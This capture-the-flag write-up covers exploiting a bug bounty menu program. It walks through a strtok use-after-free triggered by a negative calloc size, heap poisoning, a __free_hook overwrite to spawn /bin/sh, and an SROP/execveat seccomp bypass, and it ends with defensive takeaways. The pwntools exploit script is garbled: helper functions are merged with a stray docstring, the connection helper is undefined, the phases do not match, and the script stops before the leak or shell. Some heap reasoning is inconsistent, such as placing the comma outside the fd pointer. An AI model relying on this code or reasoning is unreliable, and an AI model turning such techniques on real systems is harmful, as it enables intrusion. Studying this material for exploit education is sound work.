Static Analysis

Bounty Program Overview

The bounty_program is a bug bounty management application with multiple menu options. It allows adding bug types, setting bounties, and managing submissions. The key vulnerability lies in the add type function's use of strtok.

The Vulnerable Function: add_type

c 
void add_type() {
    long size;
    int price;
    char *token;
    char *s;

    printf("Size:");
    size = read_long();

    s = (char *)calloc(1, size);   // Allocate buffer

    puts("(Note:You can add many types at the same time)");
    puts("(Example: SQLI,Buffer overflow,LFI)");
    printf("Type:");
    read_str(s, size);             // Read type names into buffer

    // Tokenize by comma - strtok operates on the string IN-PLACE
    for (token = strtok(s, ","); token; token = strtok(NULL, ",")) {
        printf("type: %s\n", token);
        printf("Price:");
        price = read_long();
        if (add_type_internal(token, price))
            puts("Success !");
        else
            puts("Failed !");
    }

    free(s);   // Free the allocated buffer
}
🚨 Vulnerability: Negative Size in calloc + strtok UAF
The size parameter for calloc is read as a signed long but is not validated for negative values. If we provide a negative size:
• calloc(1, negative_size) will fail and return NULL
• s becomes NULL, and read_str(NULL, size) does nothing meaningful
• But strtok(NULL, ",") will use the last string that strtok was operating on — a dangling pointer to previously freed memory!
• Since strtok modifies the string in-place (replacing delimiters with null bytes), it will write null bytes into the freed heap chunk, potentially corrupting heap metadata.

The strtok Internal State

strtok maintains a static internal pointer to the last tokenized string. When called with NULL as the first argument, it continues from where it left off. The key insight is:

c 
// strtok's internal state:
static char *old = NULL;  // Internal pointer to last string

char *strtok(char *s, const char *delim) {
    if (s == NULL) s = old;   // Use last string if NULL
    // Skip leading delimiters
    s += strspn(s, delim);
    if (*s == '\0') return NULL;

    // Find end of token
    char *end = s + strcspn(s, delim);
    if (*end != '\0') {
        *end = '\0';   // OVERWRITE delimiter with null byte!
        end++;
    }
    old = end;
    return s;
}

Heap Corruption via strtok

When we call add_type with a valid size first, strtok operates on the calloc'd buffer. After free(s), the buffer is returned to the heap allocator, but strtok's internal pointer still references it. If we then call add_type again with a negative size:

  1. calloc returns NULL because the size is negative (interpreted as a huge unsigned value, which calloc cannot allocate).
  2. read_str(NULL, size) does nothing — the buffer pointer is NULL.
  3. strtok(NULL, ",") uses the stale internal pointer from the previous call, pointing into freed heap memory.
  4. If the freed chunk's fd pointer contains a comma (0x2c), strtok will overwrite it with a null byte, corrupting the free list!
  5. The add_type_internal function is then called with pointers into the freed chunk, allowing further manipulation.

add_type_internal

c 
// Simplified add_type_internal
int add_type_internal(char *name, int price) {
    type_entry *entry = (type_entry *)calloc(1, sizeof(type_entry));
    if (!entry) return 0;

    entry->name = strdup(name);  // Copy the type name
    entry->price = price;
    entry->next = type_list_head;
    type_list_head = entry;

    return 1;
}
⚠️ Controlling the fd Pointer
The key to exploiting the strtok corruption is that we need the freed chunk's fd pointer to contain a 0x2c byte (comma). In glibc 2.27's tcache, freed chunks have their fd pointer pointing to the next entry in the tcache bin. By carefully controlling the heap layout and the addresses that end up in fd, we can make strtok corrupt a specific byte in a heap pointer, potentially redirecting a tcache free list to an arbitrary address.

The Wrapper's Environment Variable Power

Since the wrapper allows setting arbitrary environment variables, we can use GLIBC_TUNABLES to influence the heap allocator's behavior. For example:

bash 
# Set GLIBC_TUNABLES to disable tcache or change heap behavior
Name: GLIBC_TUNABLES
Value: glibc.malloc.tcache_count=0

# This forces all allocations through the regular fastbin/unsorted bin
# path, making the heap exploitation more predictable

Exploit Strategy

Overview

The exploit is a multi-stage heap attack that combines the strtok null-byte corruption with the environment variable injection from the wrapper to achieve code execution:

▶ Full Exploit Flow
Phase 1:Set GLIBC_TUNABLES env var via wrapper
Phase 2:Heap feng shui — allocate/free chunks to set up the layout
Phase 3:Trigger strtok UAF — null-byte corruption of fd pointer
  Poison tcache to get arbitrary allocation
Phase 4:Leak libc via corrupted allocation or unsorted bin
Phase 5:Overwrite __free_hook with system
Phase 6:Free a chunk containing "/bin/sh" → system("/bin/sh")

Phase 1: Environment Variable Setup

Using the wrapper's environment variable injection, we set up conditions that make the heap exploitation easier:

python 
# Set GLIBC_TUNABLES to control heap behavior
# This disables tcache, forcing allocations through fastbin/unsorted bin
# which are more exploitable in glibc 2.27

# Through the wrapper:
# Name: GLIBC_TUNABLES
# Value: glibc.malloc.tcache_count=0

# Alternative: set other useful environment variables
# that might help with the exploitation

Phase 2-3: Heap Feng Shui + strtok Corruption

  1. Allocate a chunk with calloc via add_type. Fill it with data that includes a comma at the right position. The key is that after freeing this chunk, the fd pointer (in tcache or fastbin) will contain a 0x2c byte.
  2. Free the chunk. It goes into the tcache or fastbin. The fd pointer now points to the next free chunk (or is NULL if it's the only one).
  3. Call add_type with negative size. calloc(1, -1) returns NULL. strtok(NULL, ",") operates on the stale pointer.
  4. strtok writes null bytes at every comma position in the freed chunk. If a comma byte falls within the fd pointer, that byte is zeroed, effectively modifying the free list pointer.
  5. The modified fd pointer now points to a different address — potentially one we control. The next allocation from this bin will return our target address!

Phase 4: Leaking Libc

With the ability to allocate at arbitrary addresses, we need to leak the libc base. Two common approaches:

  • Unsorted bin leak: Free a chunk large enough to go into the unsorted bin (> tcache max size). Its fd and bk pointers point to main_arena inside libc. If we can read these, we calculate libc_base = leak - main_arena_offset.
  • GOT leak: If Full RELRO is not in effect (it is here, so this doesn't work), we could read GOT entries. Since Full RELRO is enabled, we must use the unsorted bin approach.

Phase 5-6: Getting a Shell

Once we have the libc base, we can write system's address to __free_hook using the arbitrary allocation primitive. Then we free a chunk whose content starts with "/bin/sh", which triggers system("/bin/sh").

🔑 Seccomp Bypass: execveat
If __free_hook is not writable (glibc 2.27 should have it writable), or if we want an alternative approach, we can leverage the fact that execveat is allowed by seccomp. We can use SROP (Sigreturn-Oriented Programming) to set up registers for an execveat syscall. This is a more complex approach but works even with stricter seccomp rules.

The SROP approach:
  1. Trigger a sigreturn syscall by crafting a fake signal frame on the stack
  2. Set registers: rax=322 (execveat), rdi=100 (AT_FDCWD), rsi="/bin/sh", rdx=0, r10=0, r8=0
  3. The syscall instruction then calls execveat(100, "/bin/sh", NULL, NULL, 0)
  4. Since the wrapper passed file descriptor 100 pointing to the binary, and AT_EMPTY_PATH is available, this effectively gives us a shell

Exploit: strtok UAF + heap corruption via negative calloc size

context.log_level = 'info'

# Libc offsets (glibc 2.27, Ubuntu 18.04)

# ═══════════════════════════════════════
r = conn()

# Read wrapper prompt

r.recvuntil(b'Value:')

# Helper functions for bounty_program interaction
# ═══════════════════════════════════════
def add_type(size, types_str, prices):

    r.sendline(b'1')  # Add type menu option
    r.recvuntil(b'Size:')
    r.sendline(str(size).encode())
    r.recvuntil(b'Type:')
    r.sendline(types_str)
    for price in prices:
        r.recvuntil(b'Price:')
        r.sendline(str(price).encode())

    """Add type with negative size to trigger strtok UAF."""
    r.recvuntil(b'>')
    r.sendline(b'1')
    r.recvuntil(b'Size:')
    r.sendline(b'-1')  # Negative size!

    # read_str does nothing since s is NULL
    # But strtok(NULL, ",") will operate on freed memory
    # We don't need to send Type since read_str(NULL, size) does nothing
    # However, strtok still gets called with the stale pointer
    for price in prices:
        r.recvuntil(b'Price:')
        r.sendline(str(price).encode())

# ═══════════════════════════════════════
# Phase 2: Heap Feng Shui
# ═══════════════════════════════════════

# We want the freed chunk's fd pointer to contain 0x2c (comma)
# so strtok will zero it, corrupting the tcache/fastbin list
add_type(0x50, b'A' * 0x48 + b',', [100])
# When freed, fd pointer will be at offset 0
# The string "AAAA...," has a comma at offset 0x48

# Step 2: Allocate another chunk to prevent consolidation
add_type(0x50, b'BBBB', [200])

# Step 3: Free the first chunk (by exiting its scope)
# In the bounty program, chunks are freed when types are deleted
# or when the program reuses the calloc buffer

# strtok will find the comma in the freed chunk and zero it
# This corrupts the fastbin fd pointer

# Phase 3: Leak libc via unsorted bin
# ═══════════════════════════════════════

add_type(0x420, b'LEAK', [0])

r.sendline(b'2')  # Show types

ℹ️ Exploit Variations

The above exploit follows the __free_hook approach. An alternative using the seccomp bypass with SROP + execveat is also possible:

  • Instead of overwriting __free_hook, use the arbitrary write to build a ROP chain on the stack or in a controlled region
  • The ROP chain sets up a sigreturn frame with registers configured for execveat
  • This is more reliable against newer glibc versions where __free_hook has been removed

The exploit successfully chains the strtok UAF vulnerability with the environment variable injection from the wrapper to achieve remote code execution. The key steps are:

  • The wrapper's environment variable injection gives us GLIBC_TUNABLES control
  • The negative calloc size causes strtok to operate on freed memory

Why This Challenge Matters

🔑 Takeaways

This challenge demonstrates several advanced exploitation concepts:

  • strtok is dangerous in security-sensitive code. Its internal state management and in-place modification behavior create UAF-like conditions when the source string is freed. Always use strtok_r (reentrant version) or custom tokenizers in production code.
  • Never trust size parameters from user input. The negative calloc size should have been validated. Always check that sizes are within expected bounds.
  • Environment variable injection is powerful. The wrapper's design of allowing arbitrary env vars (with only "LD" and "MALLOC" filtered) opens the door to influencing glibc's internal behavior. In a real system, much stricter filtering is needed.
  • Seccomp isn't a silver bullet. The sandbox allows execveat and sigreturn, which are sufficient for code execution. A proper seccomp policy must carefully audit ALL allowed syscalls for potential abuse.
